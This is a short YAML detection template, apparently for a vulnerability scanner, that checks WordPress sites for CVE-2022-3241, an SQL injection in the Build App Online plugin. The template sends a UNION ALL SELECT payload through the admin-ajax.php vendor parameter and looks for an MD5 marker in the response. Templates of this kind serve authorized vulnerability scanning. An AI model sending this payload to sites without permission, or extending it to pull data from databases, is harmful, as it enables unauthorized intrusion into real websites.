name: poc-yaml-wordpress-build-app-online-cve-2022-3241-sqli
binding: 59093a42-77a5-4749-ac2a-48abdf2744c2
manual: true
detail:
    author: Â∞èz
    links:
        - https://wpscan.com/vulnerability/a995dd67-43fc-4087-a7f1-5db57f4c828c
    vulnerability:
        level: critical
transport: http
set:
    rInt0: string(randomInt(4000, 70000))
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=build-app-online-vendor_reviews&vendor=-3065%20UNION%20ALL%20SELECT%209921,md5({{rInt0}}),9921,9921,9921,9921,9921,9921,9921,9921
            follow_redirects: false
        expression: response.body_string.contains(substr(md5(rInt0), 2, 28))
expression: r1()
